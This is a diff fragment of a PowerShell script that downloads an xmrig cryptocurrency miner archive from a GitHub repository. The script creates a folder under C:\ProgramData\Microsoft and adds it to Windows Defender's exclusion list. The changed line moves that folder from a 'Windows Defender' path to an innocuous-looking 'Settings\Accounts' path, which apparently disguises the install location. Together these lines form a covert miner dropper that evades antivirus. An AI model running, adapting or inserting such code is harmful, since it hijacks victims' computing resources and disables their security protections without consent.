@@ -94,7 +94,7 @@ Set-Variable -Name currentDir -Value ($Pwd)
 
 Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/xmrig-6.22.2-msvc-win64.zip"
 
-$confirm = "C:\ProgramData\Microsoft\Windows Defender"
+$confirm = "C:\ProgramData\Microsoft\Settings\Accounts"
 
 mkdir "$confirm\xmrig-6.22.2"
 Add-MpPreference -ExclusionPath "$confirm\xmrig-6.22.2"
